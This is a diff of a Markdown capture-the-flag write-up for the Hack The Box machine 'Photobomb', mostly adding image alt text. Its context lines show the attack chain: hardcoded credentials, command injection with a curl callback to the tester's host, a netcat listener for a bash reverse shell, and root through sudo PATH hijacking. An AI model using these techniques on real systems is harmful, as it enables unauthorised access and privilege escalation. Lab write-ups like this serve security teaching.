@@ -1,4 +1,4 @@
-# HTB - Photobomb
+﻿# HTB - Photobomb
 
 **IP Address:** `10.10.11.182`  
 **OS:** Ubuntu Focal  
@@ -36,7 +36,7 @@ Verify if the host is alive:
 ping -c 1 10.10.11.182
 ```
 
-![](screenshots/ping.png)
+![ping](screenshots/ping.png)
 
 ---
 ### 1.2 Port Scanning
@@ -54,7 +54,7 @@ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.182 -oG allPorts
 - `-Pn`: Skip host discovery (already confirmed alive)  
 - `-oG`: Output in grepable format
 
-![](screenshots/allports.png)
+![allports](screenshots/allports.png)
 
 Extract open ports:
 
@@ -62,7 +62,7 @@ Extract open ports:
 extractPorts allPorts
 ```
 
-![](screenshots/extractports.png)
+![extractports](screenshots/extractports.png)
 
 ---
 ### 1.3 Targeted Scan
@@ -77,13 +77,8 @@ nmap -p22,80 -sC -sV 10.10.11.182 -oN targeted
 - `-sV`: Detect service versions  
 - `-oN`: Output in human-readable format  
 
-Let's check the result:
 
-```bash
-cat targeted -l java
-```
-
-![](screenshots/targeted.png)
+![targeted](screenshots/targeted.png)
 
 **Findings:**
 
@@ -101,7 +96,7 @@ A web application is hosted under the domain `photobomb.htb`.
 
 The OS version is identified as **Ubuntu Focal** from Launchpad.
 
-![](screenshots/launchpad.png)
+![launchpad](screenshots/launchpad.png)
 
 Fingerprinting the web server with WhatWeb:
 
@@ -109,31 +104,31 @@ Fingerprinting the web server with WhatWeb:
 whatweb http://10.10.11.182
 ```
 
-![](screenshots/whatweb.png)
+![whatweb](screenshots/whatweb.png)
 
 ### 2.2 Website Analysis
 
 Browsing the website:
 
-![](screenshots/web.png)
+![web](screenshots/web.png)
 
 The **Click here!** button requests credentials:
 
-![](screenshots/web_login.png)
+![web_login](screenshots/web_login.png)
 
 If cancelled:
 
-![](screenshots/web_login_cancel.png)
+![web_login_cancel](screenshots/web_login_cancel.png)
 
 It redirects to `/printer` but denies access due to missing credentials.
 
 Inspecting the source code:
 
-![](screenshots/web_code.png)
+![web_code](screenshots/web_code.png)
 
 Reveals a `photobomb.js` file:
 
-![](screenshots/web_photobomb_js.png)
+![web_photobomb_js](screenshots/web_photobomb_js.png)
 
 Credentials found:
 
@@ -143,13 +138,13 @@ pH0t0:b0Mb!
 
 Login succeeds:
 
-![](screenshots/web_printer.png)
+![web_printer](screenshots/web_printer.png)
 
 ### 2.3 Functionality
 
 The web offers a gallery with options to select filetype and dimensions for download:
 
-![](screenshots/web_printer_photo_config.png)
+![web_printer_photo_config](screenshots/web_printer_photo_config.png)
 
 Downloaded file viewed with Kitty terminal:
 
@@ -157,7 +152,7 @@ Downloaded file viewed with Kitty terminal:
 kitty +kitten icat test.jpg
 ```
 
-![](screenshots/kitten_test.png)
+![kitten_test](screenshots/kitten_test.png)
 
 Image resizing suggests a backend conversion process, similar to `convert`:
 
@@ -165,7 +160,7 @@ Image resizing suggests a backend conversion process, similar to `convert`:
 convert test.jpg -resize 500x500 new.jpg
 ```
 
-![](screenshots/kitten_new.png)
+![kitten_new](screenshots/kitten_new.png)
 
 ---
 ## 3. Exploitation
@@ -182,7 +177,7 @@ Verifying with:
 ;curl+10.10.14.10
 ```
 
-![](screenshots/burpsuite.png)
+![burpsuite](screenshots/burpsuite.png)
 
 A callback is received, confirming execution.
 
@@ -190,7 +185,7 @@ A callback is received, confirming execution.
 
 Create a malicious `index.html` containing a bash reverse shell payload:
 
-![](screenshots/index_bash.png)
+![index_bash](screenshots/index_bash.png)
 
 Modify the request:
 
@@ -206,7 +201,7 @@ nc -lvnp 443
 
 Send the request:
 
-![](screenshots/burpsuite_index_bash.png)
+![burpsuite_index_bash](screenshots/burpsuite_index_bash.png)
 
 Reverse shell obtained.
 
@@ -215,7 +210,7 @@ Reverse shell obtained.
 
 Confirming access and retrieving the user flag:
 
-![](screenshots/user_flag.png)
+![user_flag](screenshots/user_flag.png)
 
 ✅ **User flag obtained**
 
@@ -230,17 +225,17 @@ Check sudo privileges:
 sudo -l
 ```
 
-![](screenshots/wizard_sudo_l.png)
+![wizard_sudo_l](screenshots/wizard_sudo_l.png)
 
 User can execute `/opt/cleanup.sh`.
 
 Inspect the script:
 
-![](screenshots/cleanup_code.png)
+![cleanup_code](screenshots/cleanup_code.png)
 
 It incorrectly uses `[` without absolute path, making it exploitable.
 
-![](screenshots/command_square_bracket.png)
+![command_square_bracket](screenshots/command_square_bracket.png)
 
 ### 5.2 PATH Hijacking
 
@@ -252,7 +247,7 @@ chmod +x [
 nano [
 ```
 
-![](screenshots/square_bracket.png)
+![square_bracket](screenshots/square_bracket.png)
 
 Contents of file:
 
@@ -266,7 +261,7 @@ Execute the script with manipulated PATH:
 sudo PATH=/tmp:$PATH /opt/cleanup.sh 
 ```
 
-![](screenshots/root_flag.png)
+![root_flag](screenshots/root_flag.png)
 
 🏁 **Root flag obtained**
 
